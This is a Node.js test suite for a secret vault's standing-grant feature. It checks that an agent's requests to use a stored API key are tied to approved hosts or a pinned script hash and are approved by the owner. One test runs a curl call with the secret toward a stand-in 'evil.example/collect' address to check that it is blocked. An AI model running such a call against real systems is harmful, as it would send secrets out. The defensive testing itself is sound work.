#!/usr/bin/env node
/**
 * LANE vault-standing-request (the owner 2026-10-30, four «允许一次» cards in two minutes for `python3 transcribe.py partNN.mp3`,
 * each saying «发往 未知 … 不提供「总是允许」：发往何处未知»: 「能不能让 agent 自行申请权限，我手填填不明白 … 我的意思是常驻的，跟我配
 * "谁可以用"等效的权限」). FAST — a real vault engine (scratch, set up + unlocked), a real grants store on disk, the ONE writer
 * (src/server/vault-use-grants.js), the run door, the For-you store; fake tools in a read-only folder. Every rule a named leg:
 *   ① a STANDING request (`request --standing`) files ONE card; its Allow (验证是你) writes THE SAME vault-use member the row's
 *     «谁可以用» writes (source 'request', no end); the same scope is asked once while open; Deny quiets it 10 min; a plain
 *     request keeps once / 8h; a lock does not end the grant (the lock refuses the run).
 *   ② the run card of a command whose destination cannot be read offers «Always (this command)» = a standing grant on the
 *     COMMAND SHAPE (program real path + script real path + its sha256); a changed script / program = a new shape = a card; a
 *     late card still offers no «Always».
 *   ③ the scope is enforced: hosts-only ⇒ an unreadable destination still cards; a command grant admits exactly its shape
 *     (never a known tool); the row says its scope.
 *   ④ the agent is told the recipe (a run let through once, a card nobody answered); list / uses say «standing».
 *   ⑤ every use under it is a vault-use line naming the grant; the lock refuses, the grant stays.
 * ROUND 2 (the r1 acceptance's three majors, the judged fourth, two minors, below the cut, 主开发's visual read) — each RED
 * on d7a6b5588 by name:
 *   ⑥ (MAJOR 1, probe P1) the request obeys the owner's ROW RULES — ONE validator judges it before the card: a wildcard host
 *     needs its --tool (refused `tool_required` with the recipe), a wildcard with its tool admits only that tool;
 *   ⑦ (MAJOR 2, probe P7) THE PIN GRAMMAR — a CENSUS over every shell and interpreter row: a planted file named like each
 *     inline door never pins (the pure candidate AND the request); the shape = the program + every word up to the script;
 *   ⑧ (MAJOR 3, probe P6) a standing member exists only where the owner can SEE and ✕ it — the agent's own entry draws its
 *     members; a census: every entry class a writer can reach is drawn by the window's reader;
 *   ⑨ (JUDGE 4, probe P2 — reproduced) a standing write beside a TIMED member says «this replaces the time-limited grant»;
 *   ⑩ (MINOR 5) a closed entry's standing card says the Allow turns its switch on; ⑪ (MINOR 6) a Deny quiets the
 *     (conversation, entry) pair for every ask kind and scope; ⑫ (below the cut) `already: 'timed'` + its end; `uses`
 *     carries the STORED grant; ⑬ (VISUAL) the standing card is label rows + ONE fold, a vault reference never a link.
 * ROUND 3 (the r2 acceptance's three majors + the env door it could not verify — reproduced) — each RED on 99ecf78e4 by name:
 *   ⑭ (MAJOR 1, legacy-wild / legacy-wild-e2e) a legacy wildcard (carried with no tool) is a MIGRATION fact: the rules judge
 *     THIS write; the unlock carry gives it the CLI the tool table names; one nobody can name is named on its row + told once;
 *   ⑮ (MAJOR 2, expired-revived) a standing write never widens: it REPLACES a member with an end (the card says so, only then);
 *     an expired member is never merged by any write;
 *   ⑯ (MAJOR 3, pin-doors) a script word is pinned only where the interpreter reads that file — a URI scheme never; a POSIX
 *     shell only `./job.sh`; a census over every row;
 *   ⑰ (item 4, pin-doors C — reproduced) every pinned row names its startup-code env doors and every one is refused.
 * ROUND 3b (主开发's ruling on the flagged one — RED on 6665607bf by name):
 *   ⑱ a run card's own «Always» onto a LIVE member never widens it: another end ⇒ a REPLACEMENT that says so (exactly the
 *     asked hosts and end — never A+B with no end); the same end (both none) adds.
 * ROUND 4 (THE ROOT MODEL — a member's scopes carry their own ends) ⑲–㉖, each RED on 45c537a29 by name (inline below).
 * ROUND 5 (the r4 acceptance of 50873938d — RED on it by name):
 *   ㉗ (MAJOR) what the row will be is drawn ON the card's own row above the answers, in every client (the tray / chat row, the
 *     For-you window's pane, 中文) — never only in the hint the hosts «Always» hides;
 *   ㉘ a card the press drew again is MARKED (its change row and its prose) — never the old face;
 *   ㉙ (MINOR 1) a LATE card describes no «Always» (no «Always (this command)» words, the base's «No «Always»: why» line back);
 *   ㉚ (MINOR 2) «As each has it now»: a new host takes the EARLIEST live end; with none live, the picker's default — said first;
 *   ㉛ (TO VERIFY) a redraw goes through the For-you store's OWN bound — a 30 KB facts card stays the stub on disk;
 *   ㉜ (the acceptance's press probe C3) a write that THROWS mid-press is restored like any failed one.
 * Each leg is guarded (a base tree without the feature fails BY NAME, never by a crash) — the RED control runs this file
 * against the base's src (report.md).
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { createRequire } from 'node:module';
import { scratch } from './scratch.mjs';

const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
const VR = require(path.join(REPO, 'src/vault-run.js'));
const FA = require(path.join(REPO, 'src/foryou-actions.js'));
const VI = require(path.join(REPO, 'src/vault-inventory.js'));
const VE = require(path.join(REPO, 'src/server/vault-engine.js'));
const VC = require(path.join(REPO, 'src/server/vault-contents.js'));
const GS = require(path.join(REPO, 'src/server/grants-store.js'));
const UG = require(path.join(REPO, 'src/server/vault-use-grants.js'));
const DOOR = require(path.join(REPO, 'src/server/vault-run-door.js'));
const { UserTodoManager } = require(path.join(REPO, 'src/user-todos.js'));

let pass = 0, fail = 0;
const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + (typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : '')); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
/** A leg: an exception is a FAILED leg by name (a base tree without the feature), never a crash of the suite. */
async function leg(name, fn) { try { await fn(); } catch (e) { fail++; console.error(`  ✗ ${name} — threw: ${String(e && e.stack || e).split('\n').slice(0, 3).join(' | ')}`); } }

const ROOT = scratch('vault-standing');
fs.rmSync(ROOT, { recursive: true, force: true }); fs.mkdirSync(ROOT, { recursive: true });
const PW = 'second password for the standing-request suite';
const BIN = path.join(ROOT, 'bin');
fs.mkdirSync(BIN, { recursive: true });
for (const t of ['curl', 'wget', 'python3', 'sh', 'bash', 'deno', 'lua', 'mytool', 'aws']) fs.writeFileSync(path.join(BIN, t), `#!/bin/sh\nif [ -n "$T" ]; then w='with T'; else w='without T'; fi\nprintf '%s ran %s for %s\\n' '${t}' "$w" "$*"\n`, { mode: 0o555 });   // r5: a /bin/sh fake (ABSOLUTE shebang — never recurses through a fake named sh) — a node fake per run was most of the suite's time
fs.chmodSync(BIN, 0o555);   // read-only, declared root-owned below: programWritable is false (psha null)
process.on('exit', () => { try { fs.chmodSync(BIN, 0o755); fs.rmSync(ROOT, { recursive: true, force: true }); } catch { } });
const VALUE = ['tts', 'api', 'key', crypto.randomBytes(8).toString('hex')].join('-');   // built at runtime (never a literal secret)
const CID = 'cid-transcriber-1';

let worldN = 0;
async function world({ instance = 'cluster', timers, bin = BIN } = {}) {
  const dir = path.join(ROOT, 'w' + (++worldN)); const dataDir = path.join(dir, 'data'), work = path.join(dir, 'work'), runRoot = path.join(dir, 'run');
  for (const d of [dataDir, work, runRoot]) fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(work, 'transcribe.py'), 'import os, sys\nprint("segment", sys.argv[1:])\n');
  fs.writeFileSync(path.join(work, 'other.py'), 'print("other")\n');
  const frames = [];
  const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: { log() {}, warn() {} }, idleTimer: false, register: false, bcast: (m) => frames.push(m) });
  await vault.setup(PW);
  const userTodos = new UserTodoManager({ dataDir, expirySweepMs: 3600e3 });
  const grants = GS.create({ dataDir });
  const logs = [];
  const useGrants = UG.create({ grants: () => grants, vault, dataDir, log: (m) => logs.push(String(m)) });
  const sources = { secrets: () => VC.secretSource({ vault }) };
  const facts = (caller) => ({ conversationKeys: [caller.conversationId], groupIds: [] });
  const door = DOOR.create({ dataDir, vault, userTodos, sources, instanceKind: () => instance, runRoot: () => runRoot, home: os.homedir(), agentEnv: () => ({ ...process.env, PATH: bin + ':' + process.env.PATH }), killGraceMs: 400, pipeGraceMs: 300, liveOf: () => true, log: (m) => logs.push(String(m)), useGrants, useFacts: facts, isRootOwned: (p) => p === bin || String(p).startsWith(bin + '/'), ...(timers ? { timers } : {}) });
  const caller = (cid = CID, name = 'Transcriber') => ({ conversationId: cid, sessionKey: `claude:${cid}`, name, cwd: work, scope: cid });
  const name = 'secret:' + crypto.randomBytes(5).toString('hex');
  const put = vault.secretPut(name, VALUE, { prov: 'owner', label: 'TTS API key', kind: 'api-key', hosts: [] });
  if (!put.ok) throw new Error('secretPut ' + put.code);
  const e = { name, id: `secrets:${name}#secret`, ref: `vault://secrets/${name}/secret` };
  return { dir, dataDir, work, vault, userTodos, grants, useGrants, door, logs, frames, caller, e, sources };
}
const openOf = (w, type) => (w.userTodos.snapshot().open || []).filter((i) => i.action && i.action.type === type);
const cardsOf = (w) => openOf(w, 'vault-run-ask');
const RUN = (ref, ...argv) => ['--env', `T=${ref}`, '--', ...argv];
async function runAnswered(w, args, { answer = null, reauthed = false, caller = w.caller(), door = w.door, leave = false, ttl } = {}) {
  let settled = false;
  const before = new Set(cardsOf(w).map((c) => c.id));
  const p = door.run({ caller, args, cwd: w.work }).then((r) => { settled = true; return r; });
  let card = null;
  const t = Date.now();
  while (!settled && Date.now() - t < 3000) { const c = cardsOf(w).filter((x) => !before.has(x.id)); if (c.length) { card = c[c.length - 1]; break; } await sleep(5); }
  const drawn = card ? JSON.parse(JSON.stringify(card)) : null;   // r5: the card AS DRAWN (the snapshot's item is live — after the press it reads as decided)
  let a = null;
  if (card && answer) a = door.answer(card.action.askId, { answer, reauthed, ...(ttl ? { ttl } : {}) });
  if (card && !leave && (!answer || (a && !a.ok))) door.answer(card.action.askId, { answer: 'deny' });
  return { r: await p, card, drawn, a };
}
/** r4: a stored member read as its SCOPES — the r4 shape (`scopes`, each its own end) or the one-end shape before it (each scope
 *  with the member's end) — read HERE, never through the tree's own reader, so the RED control on a base tree reads the same.
 *  The view keeps the fields the older legs read: `hosts` / `commands` / `toolFor` (when it has some), `until` (the ONE end its
 *  scopes share — 'mixed' when they differ), `source` + `at` (the latest scope's writer). */
const viewOf = (m) => {
  if (!m) return null;
  const sc = Array.isArray(m.scopes)
    ? m.scopes.map((s) => (s.command ? { kind: 'command', command: s.command, until: s.until || null, source: s.source || null, at: s.at || null } : { kind: 'host', host: s.host, until: s.until || null, tool: s.tool || null, source: s.source || null, at: s.at || null }))
    : [...(m.hosts || []).map((h) => ({ kind: 'host', host: h, until: m.until || null, tool: (m.toolFor || {})[h] || null, source: m.source || null, at: m.at || null })), ...(m.commands || []).map((c) => ({ kind: 'command', command: c, until: m.until || null, source: m.source || null, at: m.at || null }))];
  const hosts = sc.filter((s) => s.kind === 'host').map((s) => s.host), commands = sc.filter((s) => s.kind === 'command').map((s) => s.command);
  const tf = {}; for (const s of sc) if (s.kind === 'host' && s.tool) tf[s.host] = s.tool;
  const ends = [...new Set(sc.map((s) => s.until))], last = sc.reduce((a, s) => (s.at && (!a || s.at >= a.at) ? s : a), null);
  const { scopes: _s, hosts: _h, commands: _c, toolFor: _t, until: _u, source: _src, at: _at, ...rest } = m;
  return { ...rest, scopes: sc, ...(hosts.length ? { hosts } : {}), ...(commands.length ? { commands } : {}), ...(Object.keys(tf).length ? { toolFor: tf } : {}), until: ends.length === 1 ? ends[0] : ends.length ? 'mixed' : null, source: last ? last.source : (m.source || null), at: last ? last.at : (m.at || null) };
};
/** one scope of a member's view: its end (null = none) — undefined when the member does not hold it */
const endOfScope = (m, host) => { const s = m && m.scopes.find((x) => x.kind === 'host' && x.host === host); return s ? s.until : undefined; };
const memberOf = (w, cid = CID) => { const [row] = w.grants.rowsFor('vault-use', w.e.id); return row ? viewOf((row.to || []).find((m) => m.key === cid) || null) : null; };
const useLines = (w) => { try { return fs.readFileSync(path.join(w.dataDir, 'vault-audit.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((x) => x.event === 'vault-use'); } catch { return []; } };
const sha = (p) => crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');
// r5: THE CARD AS THE CLIENTS DRAW IT — the tray / chat row and the phone (user-todos-row runFactsHtml, with its answers), the
// For-you window's pane and a record's fold (the same renderer, buttons: false — the window's answers are its action row); in
// the viewer's language (the client dictionaries)
const ROW = await import(new URL('../src/lib/user-todos-row.js', import.meta.url).href).catch(() => null);
const VUR = await import(new URL('../src/lib/vault-use-row.js', import.meta.url).href).catch(() => null);
const ZH = (await import(new URL('../src/lib/i18n-zh.js', import.meta.url).href)).default;
const tFor = (d) => (s, p) => { let x = (d && d[s]) || s; if (p) x = x.replace(/\{(\w+)\}/g, (m, k) => (p[k] !== undefined ? String(p[k]) : m)); return x; };
const textOf = (h) => String(h || '').replace(/<[^>]+>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&');
const drawnHtml = (item, t = tFor(null), opts) => (ROW && typeof ROW.runFactsHtml === 'function' && item ? ROW.runFactsHtml(item, t, opts) : '');
/** the card's OWN row of what its answer writes, as text (null = none drawn) */
const changeRowIn = (html) => { const m = /<div class="ut-run-changes"[^>]*>([\s\S]*?)<\/div>/.exec(String(html || '')); return m ? textOf(m[1].replace(/<\/span><span/g, '</span>\n<span')) : null; };
const changeRowOf = (item, t, opts) => changeRowIn(drawnHtml(item, t, opts));
/** r3: plant a row of LEGACY members exactly as the 2.369.363/.364 carry stored them — a wildcard host, NO tool, no source —
 *  under the vault's own mark over the writer's canon at generation 0 (a fresh row: no generation yet). The same member the
 *  reviewer's probe wrote with the base's own code; it verifies on every tree since (the canon appends only when present). */
const plantLegacy = (w, members) => w.grants.set('vault-use', w.e.id, { to: members.map(({ key, name, hosts, until = null }) => ({ kind: 'conversation', key, name, hosts, ...(until ? { until } : {}), mac: w.vault.macOf('vault-use', JSON.stringify([w.e.id, `conversation:${key}`, hosts.slice().sort(), null, until, name, [], 0])) })), except: [] }, 'migration');   // r4: + an end (the canon's fifth field)

console.log('① A STANDING REQUEST — one card, the owner\'s Allow writes THE row «谁可以用» writes (source request, no end)');
await leg('① standing request', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });   // the owner's switch: the card asks per command (his screenshot)
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'transcribe 40 audio segments with the TTS service', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  const card = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  ok(!!(q && q.ok && card && card.action.standing === true), '①a `request --standing --command "python3 transcribe.py"` files ONE For-you card marked standing (its answers: Allow (standing) / Deny)', { q, action: card && card.action });
  ok(!!(card && /asks for a standing grant/.test(card.text) && /For the command python3 transcribe\.py/.test(card.detail) && /Until you revoke it/.test(card.detail) && card.detail.includes(fs.realpathSync(path.join(BIN, 'python3'))) && card.detail.includes(fs.realpathSync(path.join(w.work, 'transcribe.py')))), '①b the card says WHO asks, for WHICH command (the program\'s and the script\'s real paths), and «until you revoke it»', card && { text: card.text, detail: card.detail });
  const dup = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'again', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  ok(!!(dup && !dup.ok && dup.code === 'request_pending'), '①c the same (conversation, entry, scope) is asked ONCE while open ⇒ request_pending', dup);
  const once = q && w.door.answerRequest(q.askId, { answer: 'once', reauthed: true });
  ok(!!(once && !once.ok && once.code === 'bad_grant_answer'), '①d a standing request is never answered once / 8h (bad_grant_answer — the card stays up)', once);
  const noPw = q && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: false });
  ok(!!(noPw && !noPw.ok && noPw.code === 'reveal_needs_password' && !memberOf(w)), '①e Allow needs 验证是你 (reveal_needs_password; nothing written)', noPw);
  const yes = q && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true, person: true });
  const m = memberOf(w);
  const tok = m && m.commands && m.commands[0];
  ok(!!(yes && yes.ok && yes.grantedFor === 'standing' && m && m.source === 'request' && !m.until && !m.hosts && tok && tok.program === fs.realpathSync(path.join(BIN, 'python3')) && tok.arg === fs.realpathSync(path.join(w.work, 'transcribe.py')) && tok.sha === sha(path.join(w.work, 'transcribe.py'))), '①f the Allow writes THE vault-use member (door vault-use, resource = the entry, to = the conversation): the command shape {program, script, sha256}, source «request», NO end', { yes, m });
  const rec = (w.userTodos.snapshot().resolved || []).find((i) => q && i.action && i.action.askId === q.askId);
  ok(!!(rec && rec.resolvedBy === 'granted' && rec.resolvedFact && rec.resolvedFact.grantedFor === 'standing'), '①g the card\'s record says granted · standing («allowed by you until you revoke it»)', rec && { by: rec.resolvedBy, fact: rec.resolvedFact });
  const runs = [];
  for (const part of ['part01.mp3', 'part02.mp3', 'part03.mp3']) runs.push(await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', part)));
  ok(runs.every((x) => x.r.ok && x.r.allowedBy !== undefined ? true : x.r.ok) && runs.every((x) => !x.card), '①h every later segment runs with NO card (the owner\'s loop of 40 is one Allow)', runs.map((x) => ({ ok: x.r.ok, code: x.r.code, card: !!x.card })));
  const lines = useLines(w).filter((l) => l.door === 'run' && l.outcome === 'ok');
  ok(lines.length >= 3 && lines.slice(-3).every((l) => /^vg-[0-9a-f]{8}$/.test(String(l.grant))) && !JSON.stringify(lines).includes(VALUE), '⑤a each of those uses is a vault-use line naming the STANDING grant it rode (by grant · standing) — never the value', lines.slice(-3).map((l) => ({ grant: l.grant, outcome: l.outcome })));
  w.vault.lock();
  const locked = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'part04.mp3'));
  ok(!locked.r.ok && locked.r.code === 'vault_locked' && w.grants.rowsFor('vault-use', w.e.id).length === 1, '①i/⑤b a LOCK refuses the run (vault_locked) and does NOT end the grant — the row stays (it is the owner\'s row, not an 8-hour grant)', { code: locked.r.code, rows: w.grants.rowsFor('vault-use', w.e.id).length });
  await w.vault.unlock(PW);
  const after = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'part05.mp3'));
  ok(after.r.ok && !after.card, '①j unlocked again: the next segment runs with no card — the standing grant held through the lock', { ok: after.r.ok, code: after.r.code });
  const uses = w.door.usesFor(w.caller());
  const st = uses && uses.standing && uses.standing[0];
  ok(!!(st && st.entry === w.e.ref && st.commands.join() === 'python3 transcribe.py' && st.source === 'request' && st.since), '④a `vibespace-vault uses` lists it: standing · the command python3 transcribe.py · since <when>', uses && uses.standing);
  const list = w.door.runnableFor(w.caller());
  const le = list && (list.entries || []).find((x) => x.ref === w.e.ref);
  ok(!!(le && le.by === 'standing' && (le.commands || []).join() === 'python3 transcribe.py' && le.since), '④b `vibespace-vault list` says standing + its scope + since', le);
});

console.log('①\' the request road\'s other edges — a hosts scope, Deny quiets 10 min, refusals by name, a plain request unchanged');
await leg('① edges', async () => {
  const w = await world();
  const h = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'call the TTS API', standing: true, hosts: ['api.tts.example'], cwd: w.work });
  const c2 = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'the transcriber', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  ok(!!(h && h.ok && c2 && c2.ok && h.askId !== c2.askId), '①k another SCOPE of the same entry is its own question (hosts vs the command) — both filed', { h, c2 });
  const den = c2 && w.door.answerRequest(c2.askId, { answer: 'deny' });
  const again = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'please', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  ok(!!(den && den.ok && again && !again.ok && again.code === 'request_quiet'), '①l Deny quiets the same ask for 10 minutes (request_quiet), as today', { den, again });
  const yes = h && w.door.answerRequest(h.askId, { answer: 'standing', reauthed: true });
  const m = memberOf(w);
  ok(!!(yes && yes.ok && m && (m.hosts || []).join() === 'api.tts.example' && m.source === 'request' && !m.until), '①m a hosts-scoped Allow writes the member with those hosts (the row\'s «主机»), source request, no end', m);
  const curl = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://api.tts.example/v1/tts'));
  ok(curl.r.ok && !curl.card, '①n a command to a granted host runs with no card (the entry\'s switch flipped in the same act, only this member resumed)', { ok: curl.r.ok, code: curl.r.code });
  const none = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, cwd: w.work });
  const known = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, command: 'curl https://api.tts.example/', cwd: w.work });
  const inline = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, command: 'python3 -c', cwd: w.work });
  const missing = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, command: 'python3 nowhere.py', cwd: w.work });
  const anyHost = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, hosts: ['*'], cwd: w.work });
  ok([none, known, inline, missing, anyHost].map((x) => x && x.code).join() === 'scope_required,command_has_hosts,command_not_pinnable,command_unreadable,standing_bad_host', '①o refused BY NAME: no scope, a known tool by --command (its hosts are read — ask --host), inline code (-c: r2 command_not_pinnable), a script that is not there, «any host»', [none, known, inline, missing, anyHost].map((x) => x && x.code));
  const w3 = await world();   // a CLOSED entry (no switch, no grant) — the plain road asks
  const plain = w3.door.request({ caller: w3.caller('cid-plain-2', 'Plain'), entry: w3.e.ref, purpose: 'one run please' });
  const pr = await Promise.resolve(plain);
  const p8 = pr && pr.askId && w3.door.answerRequest(pr.askId, { answer: '8h', reauthed: true });
  ok(!!(pr && pr.ok && p8 && p8.ok && p8.grantedFor === '8h'), '①p a PLAIN request keeps once / 8h (the old road unchanged)', { pr, p8 });
});

console.log('② THE CARD\'S «Always (this command)» — where the destination cannot be read');
await leg('② card always (this command)', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const a = await runAnswered(w, RUN(w.e.ref, 'python3', 'other.py', 'seg1.mp3'), { answer: 'always', reauthed: true });
  const act = a.card && a.card.action;
  ok(!!(act && act.always === true && act.command === true), '②a the card of an interpreter + its script OFFERS «Always (this command)» (action.always + action.command)', act);
  ok(!!(a.card && a.card.detail.includes('«Always (this command)» means you trust this command itself') && !/«Always» is not offered/.test(a.card.detail) && a.card.facts && a.card.facts.always && a.card.facts.always.command && a.card.facts.always.command.offered === true && a.card.facts.always.command.words === 'python3 other.py'), '②b the card says it plainly: VibeSpace cannot see where it sends the secret; «Always» = trust THIS command; a changed program or script asks again (detail + facts)', a.card && { detail: a.card.detail.split('\n').slice(-3), facts: a.card.facts && a.card.facts.always });
  const m = memberOf(w);
  ok(!!(a.a && a.a.ok && a.r.ok && m && m.source === 'card' && !m.until && m.commands && m.commands[0].arg === fs.realpathSync(path.join(w.work, 'other.py'))), '②c its «Always» writes a standing member on the COMMAND SHAPE (source card, no end)', { a: a.a, m });
  const b = await runAnswered(w, RUN(w.e.ref, 'python3', 'other.py', 'seg2.mp3'));
  ok(b.r.ok && !b.card, '②d the next run of that command (another argument) runs with no card', { ok: b.r.ok, code: b.r.code });
  fs.writeFileSync(path.join(w.work, 'other.py'), 'print("other, changed")\n');
  const c = await runAnswered(w, RUN(w.e.ref, 'python3', 'other.py', 'seg3.mp3'));
  ok(!!c.card, '②e the script\'s bytes changed ⇒ a new shape ⇒ the card again', { card: !!c.card, code: c.r.code });
  const d = await runAnswered(w, RUN(w.e.ref, 'sh', 'other.py'));
  ok(!!d.card, '②f another program over the same script ⇒ a new shape ⇒ the card', { card: !!d.card, code: d.r.code });
  const inl = await runAnswered(w, RUN(w.e.ref, 'python3', '-c', 'print(1)'));
  ok(!!(inl.card && inl.card.action.always === false && !inl.card.action.command), '②g inline code (python3 -c …) offers NO «Always» — no command to trust', inl.card && inl.card.action);
});

console.log('②\' the deadline card unchanged — an expired card stays, a late allow is a once-pass, never «Always»');
await leg('② deadline', async () => {
  const fast = { set: (fn, ms) => setTimeout(fn, ms === VR.ASK_TTL_MS ? 60 : ms), clear: (h) => clearTimeout(h) };
  const w = await world({ timers: fast });
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const x = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'late.mp3'), { leave: true });
  await sleep(120);
  const r = x.r;
  ok(!r.ok && r.code === 'ask_expired' && /--standing --command/.test(String(r.words || '')) && /python3 transcribe\.py/.test(String(r.words || '')), '④c a card nobody answered in time (ask_expired) names the RECIPE: vibespace-vault request <ref> --standing --command "python3 transcribe.py"', { code: r.code, words: r.words });
  const late = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === 'vault-run-ask' && i.action.late);
  const al = late && w.door.answer(late.action.askId, { answer: 'always', reauthed: true });
  ok(!!(late && al && !al.ok && al.code === 'always_not_offered'), '②h a LATE card offers no «Always» (its door refuses it — the deadline rule unchanged)', { late: !!late, al });
});

console.log('③ THE SCOPE IS ENFORCED WHERE IT CAN BE');
await leg('③ scope', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  w.useGrants.addMember(w.e.id, { kind: 'conversation', key: CID, name: 'Transcriber' }, { hosts: ['api.tts.example'], source: 'owner' });
  const py = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'x.mp3'));
  ok(!!py.card, '③a a HOSTS-only grant + a command whose destination cannot be read ⇒ the card still asks (the grant did not cover it)', { card: !!py.card, code: py.r.code });
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  const q = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'transcribe', standing: true, command: 'python3 transcribe.py', cwd: w2.work });
  q && w2.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const curl = await runAnswered(w2, RUN(w2.e.ref, 'curl', 'https://evil.example/collect'));
  ok(!!curl.card, '③b a COMMAND grant never admits another command — a known tool (curl) to any host draws its card', { card: !!curl.card, code: curl.r.code });
  const pub = w2.useGrants.publicFor(w2.e.id);
  const pm = pub && (pub.to || [])[0];
  ok(!!(pm && Array.isArray(pm.commands) && pm.commands.length === 1 && (pm.hosts || []).length === 0 && pm.source === 'request' && pm.at > 0), '③c the row says which scope it has (the window\'s chips: commands / hosts, its source and when)', pm);
  const pcs = (pm && Array.isArray(pm.commands) && pm.commands.length) ? pm.commands : [{ program: '/usr/bin/python3', arg: null, sha: null, psha: null }];   // a base without command members still reaches these legs by name
  const save = w2.useGrants.setRow(w2.e.id, { to: [{ kind: 'conversation', key: CID, commands: pcs, source: pm && pm.source, at: pm && pm.at }, { kind: 'conversation', key: 'cid-owner-9', hosts: ['api.tts.example'] }], except: [] }, { reauthed: true });
  const kept = memberOf(w2), added = memberOf(w2, 'cid-owner-9');
  ok(!!(save && save.ok && kept && kept.commands && kept.commands.length === 1 && kept.source === 'request' && added && added.source === 'owner'), '③d the owner\'s «谁可以用…» Save keeps a command member as it is (its source stays) and marks a member he ADDS «你设置的»', { save, kept, added });
  const widen = w2.useGrants.setRow(w2.e.id, { to: [{ kind: 'conversation', key: CID, commands: [...pcs, { program: pcs[0].program, pre: [], arg: fs.realpathSync(path.join(w2.work, 'other.py')), sha: sha(path.join(w2.work, 'other.py')), psha: null }] }, { kind: 'conversation', key: 'cid-owner-9', hosts: ['api.tts.example'] }], except: [] }, { reauthed: false });
  ok(!!(widen && !widen.ok && widen.code === 'reveal_needs_password'), '③e a Save that ADDS a command widens ⇒ 验证是你', widen);
});

console.log('④ THE AGENT IS TOLD THE RECIPE — a run let through once names the standing road');
await leg('④ recipe', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const once = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'p1.mp3'), { answer: 'once' });
  ok(once.r.ok && /request .* --standing --command "python3 transcribe\.py"/.test(String(once.r.next || '')), '④d a run the owner let through ONCE carries `next`: ask once for a standing grant (the CLI prints it)', { ok: once.r.ok, next: once.r.next });
  const cli = fs.readFileSync(path.join(REPO, 'data/bin/vibespace-vault'), 'utf8');
  ok(/request <vault:\/\/…> --standing --for/.test(cli) && /d\.next/.test(cli) && /standing · \$\{standingScope/.test(cli), '④e the CLI: the usage names --standing, `run` prints `next`, `uses` / `list` say «standing · <scope> · since»');
});

console.log('⑥ (r2 MAJOR 1, probe P1) THE OWNER\'S ROW RULES judge the request before its card — a wildcard host needs its tool');
await leg('⑥ row rules', async () => {
  const w = await world();
  const before = openOf(w, 'vault-grant-ask').length;
  const p1 = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'publish the pages', standing: true, hosts: ['*.github.io'], cwd: w.work });
  ok(!!(p1 && !p1.ok && p1.code === 'tool_required' && /--tool/.test(String(p1.words || '')) && /--standing --host \*\.github\.io/.test(String(p1.words || '')) && openOf(w, 'vault-grant-ask').length === before && !memberOf(w)), '⑥a P1: `request --standing --host *.github.io` with no tool is REFUSED tool_required — its words carry the recipe (--tool <the CLI>); no card, nothing written', p1);
  const bad = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'publish', standing: true, hosts: ['*.github.io'], tool: 'not-a-cli', cwd: w.work });
  ok(!!(bad && !bad.ok && bad.code === 'standing_bad_tool'), '⑥b a --tool is a CLI whose destination the hub reads (standing_bad_tool otherwise)', bad);
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'publish the pages', standing: true, hosts: ['*.github.io'], tool: 'curl', cwd: w.work });
  const card = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  ok(!!(q && q.ok && card && card.facts && card.facts.hosts && card.facts.hosts[0] && card.facts.hosts[0].host === '*.github.io' && card.facts.hosts[0].tool === 'curl' && /\*\.github\.io \(via curl\)/.test(card.detail)), '⑥c with --tool curl it is filed — the card says the wildcard is for curl', { q, facts: card && card.facts });
